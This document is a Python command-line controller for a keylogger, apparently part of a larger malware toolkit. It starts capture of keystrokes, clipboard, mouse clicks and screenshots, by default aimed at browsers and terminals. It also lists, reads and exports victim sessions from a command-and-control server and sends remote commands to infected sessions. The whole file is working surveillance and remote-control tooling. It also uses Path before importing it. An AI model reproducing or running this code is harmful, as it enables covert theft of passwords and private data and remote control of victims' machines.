#!/usr/bin/env python3
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from core.keylogger import create_keylogger
import json
import argparse
import requests
from pathlib import Path

def start_keylogger(args):
    config = {
        'c2_url': args.c2,
        'flush_interval': args.interval,
        'encryption_key': args.key.encode() if args.key else None,
        'capture_mouse': not args.no_mouse,
        'capture_clipboard': not args.no_clipboard,
        'capture_screenshots': args.screenshots,
        'screenshot_interval': args.screenshot_interval,
        'target_apps': args.target_apps.split(',') if args.target_apps else ['chrome', 'firefox', 'edge', 'safari', 'terminal', 'cmd', 'powershell'],
        'exclude_apps': args.exclude_apps.split(',') if args.exclude_apps else []
    }
    
    klg = create_keylogger(config)
    print(f"Starting keylogger (session: {klg.session_id})")
    print(f"C2: {args.c2}")
    klg.start()
    
    try:
        while True:
            import time
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping...")
        klg.stop()
        print("Stopped.")

def list_sessions(args):
    try:
        resp = requests.get(f"{args.c2}/api/keylogger/sessions", timeout=10)
        data = resp.json()
        for s in data.get('sessions', []):
            print(f"{s['session_id']} | {s['first_seen']} -> {s['last_seen']} | Events: {s['event_count']}")
    except Exception as e:
        print(f"Error: {e}")

def get_session(args):
    try:
        resp = requests.get(f"{args.c2}/api/keylogger/sessions/{args.session_id}", timeout=10)
        data = resp.json()
        for e in data.get('events', []):
            if e['type'] == 'keystroke':
                print(f"[{e['timestamp']}] {e['window']}: {e['data'].get('key', '')}")
            elif e['type'] == 'clipboard':
                print(f"[{e['timestamp']}] CLIPBOARD: {e['data'].get('content', '')[:100]}")
            elif e['type'] == 'mouse_click':
                print(f"[{e['timestamp']}] CLICK: {e['data']}")
            elif e['type'] == 'screenshot':
                print(f"[{e['timestamp']}] SCREENSHOT captured")
            else:
                print(f"[{e['timestamp']}] {e['type']}: {e['data']}")
    except Exception as e:
        print(f"Error: {e}")

def export_session(args):
    try:
        resp = requests.get(f"{args.c2}/api/keylogger/sessions/{args.session_id}/export", timeout=10)
        Path(args.output).write_bytes(resp.content)
        print(f"Exported to {args.output}")
    except Exception as e:
        print(f"Error: {e}")

def send_command(args):
    try:
        resp = requests.post(f"{args.c2}/api/tasks", json={
            'session_id': args.session_id,
            'command': args.command
        }, timeout=10)
        print(resp.json())
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Keylogger Management Tool')
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    start_parser = subparsers.add_parser('start', help='Start keylogger')
    start_parser.add_argument('--c2', default='http://localhost:8080')
    start_parser.add_argument('--interval', type=int, default=30)
    start_parser.add_argument('--key', help='Encryption key')
    start_parser.add_argument('--no-mouse', action='store_true')
    start_parser.add_argument('--no-clipboard', action='store_true')
    start_parser.add_argument('--screenshots', action='store_true')
    start_parser.add_argument('--screenshot-interval', type=int, default=60)
    start_parser.add_argument('--target-apps', help='Comma-separated list')
    start_parser.add_argument('--exclude-apps', help='Comma-separated list')
    
    list_parser = subparsers.add_parser('list', help='List sessions')
    list_parser.add_argument('--c2', default='http://localhost:8080')
    
    get_parser = subparsers.add_parser('get', help='Get session events')
    get_parser.add_argument('--c2', default='http://localhost:8080')
    get_parser.add_argument('--session-id', required=True)
    
    export_parser = subparsers.add_parser('export', help='Export session')
    export_parser.add_argument('--c2', default='http://localhost:8080')
    export_parser.add_argument('--session-id', required=True)
    export_parser.add_argument('--output', required=True)
    
    cmd_parser = subparsers.add_parser('cmd', help='Send command to session')
    cmd_parser.add_argument('--c2', default='http://localhost:8080')
    cmd_parser.add_argument('--session-id', required=True)
    cmd_parser.add_argument('--command', required=True)
    
    args = parser.parse_args()
    
    if args.command == 'start':
        start_keylogger(args)
    elif args.command == 'list':
        list_sessions(args)
    elif args.command == 'get':
        get_session(args)
    elif args.command == 'export':
        export_session(args)
    elif args.command == 'cmd':
        send_command(args)